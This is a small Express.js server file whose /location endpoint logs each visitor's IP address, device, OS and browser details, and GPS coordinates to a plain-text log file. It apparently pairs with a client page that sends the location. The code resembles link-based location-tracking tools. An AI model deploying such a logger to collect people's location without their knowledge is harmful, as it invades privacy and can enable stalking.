const express = require('express');
const fs = require('fs');
const path = require('path');
const UserAgentParser = require('user-agent-parser');
const app = express();
const port = 3000;

app.use(express.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/location', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgentString = req.headers['user-agent'];
  const parser = new UserAgentParser(userAgentString);
  const ua = parser.getResult();

  const deviceType = ua.device.type || 'desktop';
  const deviceModel = ua.device.model || '';
  const deviceVendor = ua.device.vendor || '';
  const osName = ua.os.name || '';
  const osVersion = ua.os.version || '';
  const browserName = ua.browser.name || '';
  const browserVersion = ua.browser.version || '';

  const deviceInfo = `${deviceVendor} ${deviceModel} (${deviceType}) - OS: ${osName} ${osVersion} - Browser: ${browserName} ${browserVersion}`;

  const { latitude, longitude } = req.body;

  const logEntry = `${new Date().toISOString()} - IP: ${ip} - Device: ${deviceInfo} - GPS: ${latitude}, ${longitude}\n`;
  fs.appendFileSync('log.txt', logEntry);
  console.log(logEntry);

  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
